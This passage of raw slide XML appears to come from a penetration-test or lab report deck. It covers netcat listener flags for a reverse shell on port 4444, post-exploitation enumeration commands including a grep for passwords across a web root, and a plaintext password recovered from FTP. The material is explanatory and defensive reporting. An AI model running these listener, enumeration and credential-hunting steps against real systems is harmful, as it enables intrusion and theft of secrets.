        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3977640"/>
            <a:ext cx="1005840" cy="274320"/>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-l</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1600200" y="3977640"/>
            <a:ext cx="4023360" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>listen for an inbound connection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4288536"/>
            <a:ext cx="1005840" cy="274320"/>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-v</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1600200" y="4288536"/>
            <a:ext cx="4023360" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>verbose output</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4599432"/>
            <a:ext cx="1005840" cy="274320"/>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-n</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1600200" y="4599432"/>
            <a:ext cx="4023360" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>skip DNS resolution</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4910328"/>
            <a:ext cx="1005840" cy="274320"/>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-p 4444</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1600200" y="4910328"/>
            <a:ext cx="4023360" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>listen on port 4444</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6437376" y="3145536"/>
            <a:ext cx="5230368" cy="1892808"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3865"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="26" name="Image 0" descr="/home/claude/report_imgs/fig5_reverse_shell.jpg">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="3200400"/>
            <a:ext cx="5120640" cy="1783080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="5056632"/>
            <a:ext cx="5120640" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Figure 4 — connection received; interactive www-data@debian shell</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Shape 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="5577840"/>
            <a:ext cx="11064240" cy="594360"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12308"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="5577840"/>
            <a:ext cx="10515600" cy="594360"/>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The reverse shell is exploitation impact of the RCE (Slide 12) — not a separate, independent vulnerability. It converts one-off command execution into a persistent interactive session.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13</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06 · POST-EXPLOITATION</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Post-Exploitation Enumeration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1234440"/>
            <a:ext cx="10972800" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Once inside, enumeration is systematic — not random command-typing.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1691640"/>
            <a:ext cx="11064240" cy="713232"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10256"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="1691640"/>
            <a:ext cx="4206240" cy="713232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>id / whoami</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5074920" y="1691640"/>
            <a:ext cx="6400800" cy="71323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Confirms identity and group context — who are we, right now?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2478024"/>
            <a:ext cx="11064240" cy="713232"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10256"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2478024"/>
            <a:ext cx="4206240" cy="713232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>hostname / uname -a</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5074920" y="2478024"/>
            <a:ext cx="6400800" cy="71323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Kernel, architecture, and hostname — informs later privesc research.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3264408"/>
            <a:ext cx="11064240" cy="713232"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10256"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3264408"/>
            <a:ext cx="4206240" cy="713232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>cat /etc/os-release</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5074920" y="3264408"/>
            <a:ext cx="6400800" cy="71323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Confirms exact OS/distribution — Debian 10 (buster).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4050792"/>
            <a:ext cx="11064240" cy="713232"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10256"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4050792"/>
            <a:ext cx="4206240" cy="713232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>ls -la /home ; ls -la /home/defender</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5074920" y="4050792"/>
            <a:ext cx="6400800" cy="71323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Reveals other local user accounts and their home directories.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4837176"/>
            <a:ext cx="11064240" cy="713232"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10256"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4837176"/>
            <a:ext cx="4206240" cy="713232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>find /var/www/html -maxdepth 5 -type f | sort</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5074920" y="4837176"/>
            <a:ext cx="6400800" cy="71323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Full inventory of application files — application file discovery.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="5623560"/>
            <a:ext cx="11064240" cy="713232"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10256"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5623560"/>
            <a:ext cx="4206240" cy="713232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>grep -RniE 'password|passwd|username|...' /var/www/html</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5074920" y="5623560"/>
            <a:ext cx="6400800" cy="71323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Secret / source-code discovery across every application file at once.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="6172200"/>
            <a:ext cx="11064240" cy="18288"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 400000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A3550"/>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14</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06 · POST-EXPLOITATION</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Credential Discovery: How We Got the Login</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1371600"/>
            <a:ext cx="5349240" cy="1051560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6957"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="1490472"/>
            <a:ext cx="4892040" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>STEP 1 — FTP CLUE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="1783080"/>
            <a:ext cx="4892040" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F97316"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>KeepR3ading@B00ks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
